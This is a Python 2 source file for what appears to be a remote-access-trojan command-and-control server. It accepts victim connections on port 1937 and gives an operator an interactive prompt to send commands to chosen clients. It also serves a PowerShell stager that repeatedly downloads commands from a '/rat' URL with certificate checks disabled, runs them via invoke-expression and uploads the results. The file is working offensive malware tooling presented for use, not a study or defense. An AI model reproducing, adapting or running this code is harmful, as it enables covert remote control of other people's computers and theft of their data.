import socket
import threading
import logging

allConnections = []
allAddresses = []
clientCount = 0
    
def main():
    threadCommand = threading.Thread(target=get_command)
    threadCommand.start()
    threadService = threading.Thread(target=service)
    threadService.start()
    
def get_command():
    while 1:
        command = raw_input("> ")
        if command == "list":
            print "pk------address-----------------port"
            pk = 1
            for i in allAddresses:
                print str(pk) +"------" + str(i[0]) + "---------" + str(i[1])
                pk += 1
        elif command.startswith("c"):
            try:
                pk = int(command[2:])-1
            except:
                print "usage:c client_pk,exp:c 1"

            while 1:
                try:
                    msg = raw_input("control %s:%s> " % (allAddresses[pk][0], allAddresses[pk][1]))
                    #if msg == "exit":
                    #    break
                    send_message(msg, allConnections[pk])
                    allConnections[pk].settimeout(5)
                    result = allConnections[pk].recv(1024)
                    result += allConnections[pk].recv(1024)
                    result += allConnections[pk].recv(1024)
                    print result

                except KeyboardInterrupt:
                    print "Catch C-c"
                    break
                except Exception, e:
                    print "error:" + e
                    continue
                            

                

def service():
    sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )
    port = 1937
    sock.bind(('', port))
    sock.listen(5)
    while 1:
        try:
            conn, addr = sock.accept()
            conn.setblocking(1)
            print "Connected with " + addr[0] + ":" + str(addr[1])
            print "Totle Client: %d" % clientCount
            request = conn.recv(23)
            if request.find("/connect") > 0:
                send_message(keep_connect("127.0.0.1", str(port)), conn)
            #elif request.find("/connect") > 0:

            allConnections.append(conn)
            allAddresses.append(addr)
        except:
            break

def keep_connect(ip , port):
    message = '''        			
                $s = "http://%s:%s/rat"
                $w = New-Object Net.WebClient
                    while($true)
                    {
                    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
                    $r = $w.DownloadString($s)
                    while($r) {
                            $o = invoke-expression $r | out-string
                            $w.UploadString($s, $o)
                            break
                    }
                    }
	      '''%(ip,port)
    return message

def send_message(msg, conn):
    try:
        httpHead = "HTTP/1.1 200 OK\r\n"
        httpHead += "Content-type: text/html; charset=utf-8\r\n"
        httpHead += "Connection: Keep-Alive\r\n"
        httpHead += "Server: test\r\n"
        httpHead += "Content-Length: %d\r\n" % len(msg)
        httpHead += "\r\n"

        conn.send(httpHead + msg)
        return 1
    except:
        return 0    
    
            
main()
